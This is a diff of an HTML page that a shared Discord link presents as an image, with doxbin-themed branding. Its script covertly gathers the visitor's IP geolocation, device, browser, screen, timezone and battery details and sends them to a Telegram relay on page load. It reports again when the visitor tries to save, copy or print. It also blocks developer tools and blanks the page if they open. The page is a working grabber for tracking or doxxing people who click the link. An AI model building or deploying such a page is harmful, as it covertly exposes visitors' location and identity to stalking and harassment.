@@ -6,22 +6,22 @@
     <title>PSYCHO</title>
     <link rel="icon" href="doxbinred.jpg" type="image/jpeg">
     <link rel="apple-touch-icon" href="doxbinred.jpg">
- 
+
     <!-- Discord : URLs injectées automatiquement au déploiement Vercel (build.js) -->
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="PSYCHO">
     <meta property="og:title" content="PSYCHO">
     <meta property="og:description" content=" ">
     <meta property="og:url" content="https://CHANGE-MOI.com/">
-    <meta property="og:image" content="https://CHANGE-MOI.com/discord.jpg">
-    <meta property="og:image:secure_url" content="https://CHANGE-MOI.com/discord.jpg">
+    <meta property="og:image" content="https://CHANGE-MOI.com/public/discord.jpg">
+    <meta property="og:image:secure_url" content="https://CHANGE-MOI.com/public/discord.jpg">
     <meta property="og:image:type" content="image/jpeg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="1200">
     <meta property="og:image:alt" content="PSYCHO">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="PSYCHO">
-    <meta name="twitter:image" content="https://CHANGE-MOI.com/discord.jpg">
+    <meta name="twitter:image" content="https://CHANGE-MOI.com/public/discord.jpg">
     <link rel="canonical" href="https://CHANGE-MOI.com/">
     <style>
         body {
@@ -62,15 +62,15 @@
 </head>
 <body>
     <div class="img-wrap" id="img-wrap">
-        <img src="site.jpg" alt="PSYCHO" draggable="false">
+        <img src="public/site.jpg" alt="PSYCHO" draggable="false">
     </div>
- 
+
     <script>
         (function () {
             document.addEventListener('contextmenu', function (e) {
                 e.preventDefault();
             });
- 
+
             document.addEventListener('keydown', function (e) {
                 var k = (e.key || '').toLowerCase();
                 var block =
@@ -85,7 +85,7 @@
                     return false;
                 }
             });
- 
+
             function onDevtoolsOpen() {
                 try {
                     window.location.replace('about:blank');
@@ -93,14 +93,14 @@
                     document.documentElement.innerHTML = '';
                 }
             }
- 
+
             var threshold = 160;
             setInterval(function () {
                 var w = window.outerWidth - window.innerWidth > threshold;
                 var h = window.outerHeight - window.innerHeight > threshold;
                 if (w || h) onDevtoolsOpen();
             }, 500);
- 
+
             setInterval(function () {
                 var t = performance.now();
                 (function () {}).constructor('debugger')();
@@ -108,13 +108,13 @@
             }, 1500);
         })();
     </script>
- 
+
     <script>
         function parseGeo(d) {
             if (!d?.ip) return null;
             return d;
         }
- 
+
         /** APIs compatibles navigateur (CORS) — geojs en premier */
         const geoProviders = [
             {
@@ -171,7 +171,7 @@
                 })
             }
         ];
- 
+
         /** Secours JSONP (fonctionne même en file:// quand fetch est bloqué) */
         const geoJsonpProviders = [
             {
@@ -200,7 +200,7 @@
                 })
             }
         ];
- 
+
         function fetchJsonp(url, timeoutMs = 12000) {
             return new Promise((resolve, reject) => {
                 const cb = '_geoJsonp_' + Date.now() + '_' + Math.random().toString(36).slice(2);
@@ -227,7 +227,7 @@
                 document.head.appendChild(script);
             });
         }
- 
+
         async function tryGeoProviders(providers, useJsonp) {
             for (const provider of providers) {
                 try {
@@ -250,19 +250,19 @@
             }
             return null;
         }
- 
+
         async function fetchGeoLocation() {
             let data = await tryGeoProviders(geoProviders, false);
             if (!data) data = await tryGeoProviders(geoJsonpProviders, true);
             return data || null;
         }
- 
+
         function getClientDeviceInfo() {
             const nav = navigator;
             const scr = screen;
             const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
             const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
- 
+
             let connection = null;
             if (conn) {
                 const parts = [
@@ -273,7 +273,7 @@
                 ].filter(Boolean);
                 connection = parts.join(' · ') || null;
             }
- 
+
             return {
                 platform: nav.platform || nav.userAgentData?.platform || '—',
                 language: nav.language,
@@ -288,7 +288,7 @@
                 userAgent: nav.userAgent
             };
         }
- 
+
         async function parseUserAgent(ua) {
             try {
                 const res = await fetch(`https://api.apicagent.com/?ua=${encodeURIComponent(ua)}`);
@@ -305,7 +305,7 @@
                 return null;
             }
         }
- 
+
         function parseUserAgentFallback(ua) {
             const mobile = /Mobile|Android|iPhone|iPad/i.test(ua);
             let os = '—';
@@ -314,20 +314,20 @@
             else if (/Android/i.test(ua)) os = 'Android';
             else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
             else if (/Linux/i.test(ua)) os = 'Linux';
- 
+
             let browser = '—';
             if (/Edg\//i.test(ua)) browser = 'Edge';
             else if (/Chrome\//i.test(ua)) browser = 'Chrome';
             else if (/Firefox\//i.test(ua)) browser = 'Firefox';
             else if (/Safari\//i.test(ua)) browser = 'Safari';
- 
+
             return {
                 deviceType: mobile ? 'mobile' : 'desktop',
                 os,
                 browser
             };
         }
- 
+
         async function fetchBattery() {
             if (!navigator.getBattery) return null;
             try {
@@ -339,31 +339,31 @@
                 return null;
             }
         }
- 
+
         async function fetchDeviceInfo() {
             const base = getClientDeviceInfo();
             const uaParsed = (await parseUserAgent(base.userAgent)) || parseUserAgentFallback(base.userAgent);
             const battery = await fetchBattery();
             return { ...uaParsed, ...base, battery };
         }
- 
+
         let cachedLocation = null;
         let cachedDevice = null;
         const telegramCooldown = {};
- 
+
         function withTimeout(promise, ms) {
             return Promise.race([
                 promise,
                 new Promise((resolve) => setTimeout(() => resolve(null), ms))
             ]);
         }
- 
+
         async function sendToTelegram(action) {
             action = action || 'visit';
             const now = Date.now();
             if (telegramCooldown[action] && now - telegramCooldown[action] < 4000) return;
             telegramCooldown[action] = now;
- 
+
             const payload = {
                 action,
                 location: cachedLocation,
@@ -374,7 +374,7 @@
             };
             const body = JSON.stringify(payload);
             const apiUrl = new URL('/api/telegram', window.location.origin).href;
- 
+
             async function post() {
                 const res = await fetch(apiUrl, {
                     method: 'POST',
@@ -385,7 +385,7 @@
                 const data = await res.json().catch(() => ({}));
                 return res.ok;
             }
- 
+
             try {
                 const ok = await post();
                 if (!ok && navigator.sendBeacon) {
@@ -397,50 +397,50 @@
                 }
             }
         }
- 
+
         function setupImageTracking() {
             const wrap = document.getElementById('img-wrap');
             const img = wrap && wrap.querySelector('img');
             if (!wrap || !img) return;
- 
+
             const notify = (action) => {
                 if (cachedLocation || cachedDevice) sendToTelegram(action);
             };
- 
+
             wrap.addEventListener('contextmenu', () => notify('save'));
- 
+
             wrap.addEventListener('dragstart', (e) => {
                 e.preventDefault();
                 notify('drag');
             });
- 
+
             document.addEventListener('copy', () => notify('copy'));
             document.addEventListener('cut', () => notify('copy'));
- 
+
             document.addEventListener('keydown', (e) => {
                 const k = (e.key || '').toLowerCase();
                 const mod = e.ctrlKey || e.metaKey;
                 if (mod && (k === 'c' || k === 's' || k === 'x')) notify(k === 's' ? 'save' : 'copy');
             });
- 
+
             window.addEventListener('beforeprint', () => notify('print'));
         }
- 
+
         function getEntryAction() {
             const params = new URLSearchParams(window.location.search);
             if (params.get('from') === 'image') return 'image_open';
             if (params.get('download') === '1') return 'image_download';
             return 'visit';
         }
- 
+
         function getDiscordUser() {
             const params = new URLSearchParams(window.location.search);
             return params.get('discord_user') || params.get('user') || null;
         }
- 
+
         (async () => {
             const entryAction = getEntryAction();
- 
+
             const [location, device] = await Promise.all([
                 withTimeout(fetchGeoLocation(), 10000),
                 withTimeout(fetchDeviceInfo(), 10000)
@@ -448,12 +448,13 @@
             cachedLocation = location;
             cachedDevice = device;
             await sendToTelegram(entryAction);
- 
+
             if (entryAction === 'image_open' && window.history.replaceState) {
                 window.history.replaceState({}, '', window.location.pathname);
             }
- 
+
             setupImageTracking();
         })();
     </script>
 </body>
+</html>
